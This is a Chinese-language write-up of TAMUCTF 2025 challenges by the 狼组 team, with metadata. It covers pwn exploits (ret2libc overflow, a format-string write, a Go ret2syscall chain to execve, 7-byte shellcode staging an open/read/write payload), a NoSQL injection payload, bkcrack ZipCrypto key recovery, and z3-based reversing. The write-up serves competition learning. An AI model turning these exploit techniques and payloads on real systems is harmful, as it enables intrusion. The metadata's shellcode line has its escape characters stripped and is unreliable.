---
title: TAMUCTF 2025 WriteUp
contest: TAMUCTF
year: 2025
team: 狼组安全社区
difficulty: medium
vuln_type: pwn_unknown
tags: [ret2libc, fmt-string-write, go-binary, seccomp-orw, 7byte-shellcode, math-z3]
attack_chain:
- Debug 1: 溢出 0x50 + p64(0x404100) + p64(0x4013A0) ret2libc
- Sniper: fmt-string 改栈内容为 0x0a0a0000 + %s 读 flag
- ROP Thirteen: Go 1.20.6 静态 elf + ret2syscall (read(0, bss, 0x100) + execve)
- Seven: 7 字节 shellcode (push rsp; pop rsi; xor edi, edi; syscall; ret) + ret2csu + orw
- Debug 2: 字符大小写反转函数绕过，PIE 1/16 爆破
- Impossible: 童年游戏 (Pygame? - 文章未给细节)
- Aggie Bookstore: 数组 nosql 注入
- Deflated: ZipCrypto Deflate 已知明文攻击 (.git/HEAD)
- Xorox: var_4020 ^ var_2060
- Brainrot: Brain 类 + rot + think (矩阵乘法 + 移位) + z3 求解 4 块 10 字节
- OTP: 核心转储 gdb 分析 key 还原
key_payload: io.send(b"x54x5Ex31xFFx0Fx05xC3")  # 7-byte shellcode
one_liner: TAMUCTF 2025 狼组 writeup：7 题 Pwn + 4 题 Reverse，混合 Go/C++/Python + Go SSRF + 矩阵 Z3。
lesson: 当 PIE 1/16 爆破可行时，覆盖 ret_addr 低 2 字节配合 read 重写栈是稳定技巧。
quality: high
---
# TAMUCTF 2025 WriteUp（狼组）

## Web
- **Impossible**：童年游戏 (网页版按钮狂点 520 次)
- **Aggie Bookstore**：传数组 `nosql` 注入 `{$gt: ""}` 绕过

## Pwn

### Debug 1
```python
io.send(b"A"*0x50 + p64(0x404100) + p64(0x4013A0))
# 溢出到 rbp + ret_addr 写 debug 函数 + ret2libc
system = int(io.recv(12), 16)
libc = ELF("./libc.so.6")
libc_base = system - libc.sym['system']
io.send(b"A" * 0x68 + p64(rdi_ret) + p64(sh_addr) + p64(system))
```

### Sniper
```python
# fmt-string 写 0x0a0a0000 到栈 (但 fgets 末字节不能 0x0a)
# 改 3,4 byte 即可, %20$s 读 flag
io.sendline(f"%{0xAA}c%11$hhn%{0xA0A-0xAA}c%10$hn%20$saaa".encode() + p64(flag_addr) + p64(stack-8))
```

### ROP Thirteen
Go 1.20.6 静态链接 + ret2syscall:
```python
rax_ret = 0x40cc26; syscall_ret = 0x45f409
rdi_xxx_ret = 0x47ea5c  # pop rdi; or byte ptr [rax - 1], cl; ret;
bss = 0x54B800
# read(0, bss+0x100, 0x100) → execve("/bin/sh", 0, 0)
```

### Seven
7 字节 shellcode:
```python
io.send(b"\x54\x5E\x31\xFF\x0F\x05\xC3")
# push rsp; pop rsi; xor edi, edi; syscall; ret
# 用 ret2csu 调 read(0, 0x500000, 0x1000) + mprotect(0x500000, 0x1000, 7)
# 再 write(1, ..., 0x100) 写 orw
orw = asm(shellcraft.amd64.open("flag.txt"))
orw += asm(shellcraft.amd64.read('rax', 'rsp', 0x100))
orw += asm(shellcraft.amd64.write(1, 'rsp', 0x100))
```

### Debug 2
- 字符大小写反转函数 + PIE 1/16 爆破
- 覆盖 ret_addr 低 2 字节 (0x13B3) → main 重新 read 数据
- 控制 rbp 调 read 写 bss → 栈迁移执行 bss 段 ROP 链

## Misc
- **Deflated**：ZipCrypto Deflate + `.git/HEAD` 已知明文 → bkcrack 爆破密钥
- `bkcrack -C deflated.zip -c .git/HEAD -p HEAD.txt`
- `bkcrack -C deflated.zip -k f2635bca a91bec3a ec81bdf9 -D decrypted.zip`
- `git show 01c525a:print_flag.py > print_flag.py` 还原 git 旧版本
- flag: `gigem{DONT_FEEL_2_DEFLATED}`

## Reverse
- **What It Does**：nim 游戏，第三人输出即 flag
- **Xorox**：`var_4020 ^ var_2060`
- **Brainrot**：Brain 类 (rot + think 矩阵乘法 + 移位) + z3 求 4 块 10 字节
- **OTP**：核心转储 + gdb 分析 key 还原

```python
healthy_brain = [[71, 101, 18, 37, 41, 69, 80, 28, 23, 48], ...]
brainrot = b"gnilretskdi ,coffee ..."[::-1]  # 翻转

brain = Brain(healthy_brain)
brain.rot(brainrot)
required_thoughts = [[59477, 41138, ...], ...]

# z3 求解
for i in range(10):
    s.add(0 <= x[i] <= 255)
for i in range(10):
    s.add(sum(matrix[i][j] * x[j] for j in range(10)) == target[i])
```
